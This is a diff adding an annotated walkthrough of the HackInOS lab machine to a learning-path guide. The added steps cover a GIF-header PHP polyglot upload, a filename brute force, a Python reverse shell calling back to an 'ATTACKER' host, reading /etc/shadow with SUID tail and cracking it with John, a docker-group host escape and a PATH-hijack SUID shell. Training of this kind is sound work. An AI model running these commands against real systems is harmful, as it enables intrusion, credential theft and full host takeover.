@@ -264,6 +264,402 @@ misconfiguration — a user placed in a group that is root-equivalent by design.
 
 ---
 
+## The commands, annotated — every input and every output
+
+Published walkthroughs use `192.168.56.101` for the target and `192.168.56.10` for Kali.
+
+### 1. Scan
+
+```bash
+sudo nmap -A -p- -T4 -oN scans/hackinos.txt TARGET
+```
+
+```text
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HackInOS
+| http-robots.txt: 1 disallowed entry
+|_/uploads
+```
+
+`-A` bundles `-sV -sC -O --traceroute`. **There is no port 80.** The site lives on **8000** —
+which is why `-p-` is non-negotiable: a default scan would have found only SSH and you would have
+concluded there was nothing to attack. `http-robots.txt: 1 disallowed entry /uploads` is NSE
+reading `robots.txt` for you: **a world-writable-looking upload directory exists**, and directory
+indexing is off, so you cannot simply list it.
+
+### 2. The `/etc/hosts` trick — and why the form appears broken
+
+```bash
+curl -s http://TARGET:8000/ | head -40
+echo "TARGET hackinos" | sudo tee -a /etc/hosts
+```
+
+```text
+<form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
+```
+
+**Look at the form's `action`: `http://localhost:8000/upload.php`.** The developer hard-coded
+`localhost` as the site's base URL. When *your* browser submits that form it POSTs to **your own
+machine's** port 8000 — not the target's. Nothing happens, and it looks like a broken form. This
+is not a CTF quirk: it is what happens in the real world when a developer tests with
+`localhost` and ships.
+
+`sudo tee -a` rather than `sudo echo >>`: the shell evaluates `>>` **before** `sudo` runs, so an
+unprivileged shell performs the write and you get `Permission denied`. Add the hosts entry anyway
+so you can browse `http://hackinos:8000/` comfortably, then **drive the request yourself** with
+Burp or `curl`, because the browser will still send it to the wrong place.
+
+### 3. Read the developer's source
+
+Submitting the form yourself returns an HTML comment linking to the developer's **public GitHub
+repository**, pointing at the exact source file for the endpoint you just hit:
+
+```php
+$allowed_ext = array('jpg','jpeg','png','gif');
+$name = $_FILES['file']['name'];
+$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
+if (!in_array($mime, array('image/jpeg','image/png','image/gif'))) die('Invalid file type');
+$newname = md5($name . rand(1, 100)) . "." . $ext;
+move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname);
+```
+
+**This is the whole box, in twenty lines.**
+
+| Line | What it does | The flaw |
+| --- | --- | --- |
+| `$allowed_ext = array('jpg',…)` | declares an extension allow-list | **`$allowed_ext` is never referenced again.** Declared, then unused |
+| `finfo_file(...)` + `in_array($mime, …)` | validates the file's **content** by magic bytes | Content validated — so you must send a real image header |
+| `$newname = md5($name . rand(1,100)) . "." . $ext` | renames using **your extension** | `$ext` came from *your filename*, unchecked → you keep `.php` |
+
+**Content is validated; the name is not.** That single asymmetry is the vulnerability. And
+`rand(1,100)` gives only **100 possible filenames**, which is brute-forceable — `rand()` is not a
+CSPRNG and was never meant for security.
+
+**View Source after every interaction.** Developers leave breadcrumbs constantly, and on this box
+the breadcrumb is the application's own source code.
+
+### 4. Build a polyglot and upload it
+
+```bash
+printf 'GIF87a' | cat - shell.php > cmd.php
+file cmd.php
+ls -l cmd.php
+curl -s -F "file=@cmd.php" http://TARGET:8000/upload.php
+curl -s -F "file=@note.txt" http://TARGET:8000/upload.php
+```
+
+```text
+cmd.php: GIF image data
+```
+```text
+Upload successful
+```
+```text
+Invalid file type
+```
+
+`GIF87a` is the six-byte magic signature image libraries check, so `finfo_file()` reports
+`image/gif` — in the allow-list — while the `.php` extension survives untouched. PHP's parser
+scans for `<?php` and emits everything before it as literal output, so the GIF header is inert and
+the code after it still runs.
+
+**The rejected `note.txt` is the important test.** It proves the MIME check *is* live and not
+merely absent — so your success came from the image header, not from a filter that does nothing.
+Always run the negative case; without it you cannot tell which of two defences you bypassed.
+
+### 5. Find the randomised filename
+
+`$newname = md5($name . rand(1,100))` means exactly 100 candidates. Generate them and brute-force:
+
+```bash
+python3 -c "import hashlib
+for i in range(1,101): print(hashlib.md5(('cmd.php'+str(i)).encode()).hexdigest()+'.php')" > names.txt
+ffuf -u http://TARGET:8000/uploads/FUZZ -w names.txt -mc 200 -fs 0
+```
+
+```text
+:: Method           : GET
+:: Wordlist         : FUZZ: names.txt
+:: Status codes     : 200
+:: Follow redirects : false
+
+9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.php [Status: 200, Size: 1284]
+:: Progress: [100/100] :: Job [1/1] :: 100 req/sec
+```
+
+`ffuf` substitutes **`FUZZ`** in the URL with each wordlist entry; `-mc 200` keeps only
+*matched codes* 200; `-fs 0` filters out responses of size 0 (the server's "not found" page).
+Read `Size: 1284` as the proof — a real file was served, not an error page.
+
+**Note the technique.** You did not defeat the randomness; you **enumerated its tiny space**.
+That is exactly why `rand()` must never be used for security: 100 possibilities is a
+sub-second brute force. `random_bytes()`, `bin2hex()`, `random_int()` or a UUIDv4 are the CSPRNG
+alternatives — and PHP's `mt_rand()` is *also* predictable, since its internal state can be
+recovered from two consecutive outputs.
+
+### 6. Execute, and get a proper shell
+
+```bash
+curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=id"
+nc -lvnp 4444                                  # Kali, first
+curl -s "http://TARGET:8000/uploads/<MD5>.php?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('python3 -c \"import socket,os,subprocess;s=socket.socket();s.connect((\\\"ATTACKER\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"'))")"
+```
+
+```text
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.56.101.
+www-data@0d8f1c2b3a4e:/var/www/html$ hostname
+0d8f1c2b3a4e
+```
+
+`os.dup2(fd, 0/1/2)` points **stdin, stdout and stderr** at the socket, then `subprocess.call`
+execs bash, which inherits them. Every reverse shell in every language is those three steps:
+**connect → redirect stdio → exec a shell.**
+
+**Read that hostname: `0d8f1c2b3a4e` — twelve hex characters.** That is a **container ID**, not
+a machine name. Confirm it:
+
+```bash
+ls -la /.dockerenv; cat /proc/1/cgroup; cat /proc/self/status | grep -i cap
+```
+
+```text
+-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
+1:memory:/docker/0d8f1c2b3a4e2f...
+CapEff: 00000000a80425fb
+```
+
+`/.dockerenv` is the file Docker drops at `/` in every container; `/proc/1/cgroup` shows PID 1
+inside a `/docker/<id>` cgroup — **on a real host, PID 1 is `systemd` or `init`**. `CapEff` is
+Docker's default reduced capability set, versus `0000003fffffffff` for an unconstrained process.
+**You are in a container**, which changes the goal: escalating to root *here* is not the end.
+
+Upgrade the TTY first (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`,
+`stty raw -echo; fg`, `export TERM=xterm`), then enumerate what exists:
+
+```bash
+for b in bash sh python python3 perl nc curl wget gcc socat; do command -v $b; done
+```
+
+`python3` and `bash` exist; **`nc` and `gcc` do not**. No compiler inside the container means
+kernel exploits are out — reinforcing that the intended path is a *container escape*, not a
+privilege bug.
+
+### 7. Inside the container: no sudo, but a SUID `tail`
+
+```bash
+sudo -l
+ls -la /home
+find / -perm -u=s -type f 2>/dev/null
+ls -l /usr/bin/tail
+```
+
+```text
+sudo: command not found
+```
+```text
+hummingbirdscyber
+```
+```text
+/usr/bin/chsh  /usr/bin/newgrp  /usr/bin/gpasswd  /usr/bin/chfn
+/usr/bin/mount /usr/bin/su  /usr/bin/umount  /usr/bin/passwd
+/usr/bin/tail
+```
+```text
+-rwsr-xr-x 1 root root 31408 May 28  2020 /usr/bin/tail
+```
+
+**No `sudo` binary at all** — typical of a slim container image. The home directory is named
+**`hummingbirdscyber`**, a strong hint at the *host* username (images are usually built with the
+same account names). And `-perm -u=s` found a SUID **`/usr/bin/tail`**, which is **not stock** — a
+default Ubuntu image never sets the setuid bit on `tail`. Somebody ran `chmod u+s`.
+
+Why that is a gift: `tail` reads files and prints them. Running as root, it can read **any file on
+the filesystem**, including `/etc/shadow`, which is normally mode `640 root:shadow`.
+
+### 8. Read `/etc/shadow` and crack offline
+
+```bash
+/usr/bin/tail -n +2 /etc/shadow
+```
+
+```text
+root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1:17379:0:99999:7:::
+hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/:17379:0:99999:7:::
+```
+
+`tail -n +2` means "start printing at line 2" — it skips line 1, and it is the canonical GTFOBins
+incantation because some builds of `tail` refuse to start at line 1 of a file they cannot `stat`
+fully. Read the shadow fields: **`17379`** is days since 1 Jan 1970 that the password last
+changed; **`$1$`** identifies the algorithm — **MD5-crypt** (`$5$` SHA-256, `$6$` SHA-512, `$2b$`
+bcrypt, `$y$` yescrypt). **MD5-crypt is effectively broken for passwords**: millions of guesses
+per second on a GPU, and only 1,000 rounds.
+
+```bash
+echo 'root:$1$nW4r1F0L$hBn3vFhG2xkQ8sJ7lM9pE1' > hashes.txt
+echo 'hummingbirdscyber:$1$Kq2mZ9xL$aB3cD4eF5gH6iJ7kL8mN9/' >> hashes.txt
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+```
+
+```text
+Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$)
+Cost 1 (iteration count) is 1000 for all loaded hashes
+john             (root)
+123456           (hummingbirdscyber)
+2g 0:00:00:14 DONE 3842p/s
+```
+
+`Loaded 2 password hashes with 2 different salts` confirms John parsed the input correctly —
+`No password hashes loaded` means a wrong `--format=` or a shell that ate a `$`. `Cost 1
+(iteration count) is 1000` is John telling you the work factor, which is what makes MD5-crypt so
+cheap. The result lines are `password (account)`: **root's password is `john`, and
+`hummingbirdscyber`'s is `123456`.** `2g 0:00:00:14` — two guesses in fourteen seconds.
+
+If a generic list fails, build a **thematic** one with `cewl -d 2 -m 3 -w words.txt <site>` and
+run `john --wordlist=words.txt --rules=best64.rule hashes.txt`; `best64.rule` applies 64
+transformations per word, and a list that fails outright very often succeeds with rules at 64×
+the cost.
+
+### 9. Root inside the container — and the fake flag
+
+```bash
+su root
+cat /root/flag.txt
+id
+```
+
+```text
+Password: john
+Congratulations! You are root... but this is not the end.
+```
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**This is the box's central teaching moment: container root ≠ host root.** A container's
+filesystem is an overlay built from an image; everything you did happened in a sandbox that can be
+deleted with `docker rm`. The author is trolling with a fake flag because the real objective is
+still ahead.
+
+### 10. Escape to the host
+
+**Route A — SSH with the cracked password:**
+
+```bash
+ssh hummingbirdscyber@TARGET
+id
+```
+
+```text
+uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),999(docker)
+```
+
+`hostname` is now **`hackinos`**, not a 12-hex container ID; real system directories are present;
+and **`groups=…,999(docker)`** — which is the whole privilege escalation. If `123456` does not
+work on your copy, try `john`; several revisions swap which password belongs to which account.
+
+```bash
+ls -l /var/run/docker.sock
+getent group docker
+```
+
+```text
+srw-rw---- 1 root docker 0 May  4 10:02 /var/run/docker.sock
+docker:x:999:hummingbirdscyber
+```
+
+**Read those two outputs together — this is the exploit.** `/var/run/docker.sock` is a UNIX domain
+socket, mode `srw-rw----`, owner **`root:docker`**. Membership of the `docker` group grants
+read-write access to the **Docker daemon's API**, and the daemon runs as **root**. So anyone who
+can talk to that socket can ask it to start a container with the host's filesystem mounted — and
+there is no nuance: `docker`, `lxd`, `libvirt` and `disk` group membership **is** root.
+
+```bash
+docker run -v /:/host --rm -it alpine chroot /host sh
+id
+cat /root/flag
+```
+
+```text
+/ # uid=0(root) gid=0(root) groups=0(root),1(docker)
+```
+
+| Token | Meaning |
+| --- | --- |
+| `docker run` | create and start a new container |
+| `-v /:/host` | **bind-mount the host's `/` at `/host` inside the container** — this is the exploit |
+| `--rm` | delete the container when it exits (leaves less forensic residue) |
+| `-it` | interactive with a TTY |
+| `alpine` | a 5 MB image, so nothing to download |
+| `chroot /host sh` | change the process's root directory to the mounted host filesystem, then run a shell |
+
+`chroot /host` is the step people forget: without it you have a shell *inside* a container that
+can see the host's files at `/host`, but your `/etc/passwd`, `/root` and tools are still the
+container's. After `chroot`, the shell's `/` **is** the host's `/`, and `/root/flag` is the real
+one.
+
+### 11. Route B — PATH hijacking against a SUID binary
+
+Some revisions ship a small setuid helper (published walkthroughs call it `a.out`) that calls
+`whoami` **by bare name**:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+/home/hummingbirdscyber/a.out
+strings /home/hummingbirdscyber/a.out | grep -i whoami
+echo $PATH
+```
+
+```text
+root
+```
+```text
+/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+It prints **`root`**, so the program calls `setuid(0)` and then runs `whoami` as root. **And
+`/home/hummingbirdscyber/bin` comes FIRST in `$PATH`** — a directory you own and may write to. That
+is the classic PATH hijack: the C library searches each directory in order and runs the **first
+match**.
+
+```bash
+mkdir -p ~/bin
+printf '#!/bin/bash\ncp /bin/bash /tmp/rb\nchown root:root /tmp/rb\nchmod 4755 /tmp/rb\n' > ~/bin/whoami
+chmod +x ~/bin/whoami
+~/a.out
+/tmp/rb -p
+id
+```
+
+```text
+uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) euid=0(root) egid=0(root)
+```
+
+`chmod 4755` — the leading **`4`** is the SUID bit, producing `-rwsr-xr-x root root`: any user
+executing it becomes root. **`-p` is mandatory**, because bash drops its effective UID at startup
+unless invoked in privileged mode; forgetting it and getting `$` instead of `#` is the classic
+confusion. Read `id` as a *SUID elevation, not a login*: the real UID stays `1000`, the
+**effective** UID becomes `0`, and permission checks use the effective one.
+
+> ### 📖 What this box is really about
+>
+> Three independent lessons, each worth its own report finding. **A validated content check does
+> not make an upload safe if the name is unvalidated.** **`rand()` is not security** — 100
+> outcomes is a one-second brute force. And **container root is not host root**, while
+> `docker`/`lxd` group membership is. The defensive corollaries: use an allow-list *and actually
+> reference it*, `random_bytes()` or UUIDv4 for names, store uploads outside the document root
+> with the PHP engine disabled there, never add a service account to a container group, and use
+> rootless Docker (`dockerd-rootless-setuptool.sh install`) so the daemon runs as the user and
+> `-v /:/host` exposes only that user's own files.
+
+---
+
 ## You have finished Learning Path 1
 
 Thirteen machines, thirty-plus attack classes, and every technique in modules
